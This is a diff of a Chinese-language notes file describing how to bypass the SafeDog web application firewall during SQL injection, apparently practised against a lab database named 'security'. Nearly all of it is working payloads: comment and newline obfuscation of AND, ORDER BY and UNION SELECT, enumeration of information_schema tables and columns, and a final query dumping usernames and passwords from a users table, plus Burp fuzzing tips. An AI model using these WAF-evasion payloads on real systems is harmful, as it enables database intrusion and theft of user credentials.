@@ -1,45 +1,45 @@
 最新版\
-1、安全狗and的绕过（防止and和or的注入）
-将and修改为/*!12345and*/ ps:12345是任意的5位数字
-通过bp进行拦截，发送到intruder模块，进行爆破找特征值 返回结果正常即是可以被正常绕过
+1、安全狗and的绕过（防止and和or的注入）\
+将and修改为/*!12345and*/ ps:12345是任意的5位数字\
+通过bp进行拦截，发送到intruder模块，进行爆破找特征值 返回结果正常即是可以被正常绕过\
 4-6位都可以
 
-2、安全狗order by的绕过
-order by一起出现会引发安全狗警告，要在order by之间添加一些字符
-order /*//%$*/ by 1 -- 1
+2、安全狗order by的绕过\
+order by一起出现会引发安全狗警告，要在order by之间添加一些字符\
+order /*//%$*/ by 1 -- 1\
 
-3、安全狗select　union的绕过（防止联合查询）
-select和union在一起的时候会触发
-跟order by原理相同，不过需要我们用bp进行fuzz
-?id=-2' union /*/$%^*/ select 1,2,3 -- 1
+3、安全狗select　union的绕过（防止联合查询）\
+select和union在一起的时候会触发\
+跟order by原理相同，不过需要我们用bp进行fuzz\
+?id=-2' union /*/$%^*/ select 1,2,3 -- 1\
 
-4、查询数据的绕过
-database()的绕过：
-database和()放在一起的时候会触发waf
-在两者之间添加干扰符即可
-?id=-2' union /*/$%^*/ select 1,database/*////*/(),3 -- 1
-查询表的绕过：
-第一个绕过点：
-information_schema.tables
-waf会对tables进行拦截，想绕过需改成information_schema./*!tables*/
-第二个绕过点：
-from和information_schema./*!tables*/当这两个放在一起的时候会触发waf，这个时候要对from和information.schema./*!tables*/之间进行处理了
-?id=-2' union /*/$%^*/ select 1,group_concat(table_name),3 from --+/*%/ %0a
+4、查询数据的绕过\
+database()的绕过：\
+database和()放在一起的时候会触发waf\
+在两者之间添加干扰符即可\
+?id=-2' union /*/$%^*/ select 1,database/*////*/(),3 -- 1\
+查询表的绕过：\
+第一个绕过点：\
+information_schema.tables\
+waf会对tables进行拦截，想绕过需改成information_schema./*!tables*/\
+第二个绕过点：\
+from和information_schema./*!tables*/当这两个放在一起的时候会触发waf，这个时候要对from和information.schema./*!tables*/之间进行处理了\
+?id=-2' union /*/$%^*/ select 1,group_concat(table_name),3 from --+/*%/ %0a\
 information_schema./*!tables*/ -- 1
-绕过过程：首先在union和select之间放干扰符号，然后在from和information_schema之间放 --+以及正确的干扰符，然后通过%0a进行换行，最后对talbe进行内联
-但是还要通过where去指定对应的数据库
-?id=-2' union /*/$%^*/ select 1,group_concat(table_name),3 from --+/*%/ %0a
-information_schema./*!tables*/ where table_name='security' -- 1
-但是information_schema和where出现在一起需要在中间添加干扰符
-?id=-2' union /*/$%^*/ select 1,group_concat(table_name),3 from --+/*%/ %0a
-information_schema./*!tables*/ /*////*/
-where table_schema='security' -- 1  进行fuzz测试
-获取security对应表下的所有列名：
-?id=-2' union /*/$%^*/ select 1,group_concat(column_name),3 from --+/*%/ %0a
-information_schema./*!columns*/ /*////*/
-where table_schema='security' /*!12441and*/ table_name='users' -- 1
-查询数据的绕过：
-?id=-2' union /*/$%^*/ select 1,group_concat(username,0x3a,password),3 from /*////*/ users -- +
+绕过过程：首先在union和select之间放干扰符号，然后在from和information_schema之间放 --+以及正确的干扰符，然后通过%0a进行换行，最后对talbe进行内联\
+但是还要通过where去指定对应的数据库\
+?id=-2' union /*/$%^*/ select 1,group_concat(table_name),3 from --+/*%/ %0a\
+information_schema./*!tables*/ where table_name='security' -- 1\
+但是information_schema和where出现在一起需要在中间添加干扰符\
+?id=-2' union /*/$%^*/ select 1,group_concat(table_name),3 from --+/*%/ %0a\
+information_schema./*!tables*/ /*////*/\
+where table_schema='security' -- 1  进行fuzz测试\
+获取security对应表下的所有列名：\
+?id=-2' union /*/$%^*/ select 1,group_concat(column_name),3 from --+/*%/ %0a\
+information_schema./*!columns*/ /*////*/\
+where table_schema='security' /*!12441and*/ table_name='users' -- 1\
+查询数据的绕过：\
+?id=-2' union /*/$%^*/ select 1,group_concat(username,0x3a,password),3 from /*////*/ users -- +\
 
 ---
 
